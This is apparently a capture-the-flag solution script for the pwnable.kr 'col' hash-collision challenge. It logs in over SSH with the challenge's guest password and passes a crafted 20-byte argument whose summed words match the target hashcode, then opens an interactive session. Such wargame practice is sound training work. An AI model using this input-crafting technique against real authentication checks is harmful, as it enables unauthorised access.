#!/usr/bin/python3

from pwn import *

shell=ssh('col','pwnable.kr', port=2222 ,password='guest')


data=p32(0x21DD09F0)

data1=p32(0xffffffff) #-1 加起来就是hashcode

data_final=data1*4+data

p=shell.process(argv=['./col',data_final]) #带参运行

#attach(p)

#context(arch='amd64',os='linux')

p.interactive()
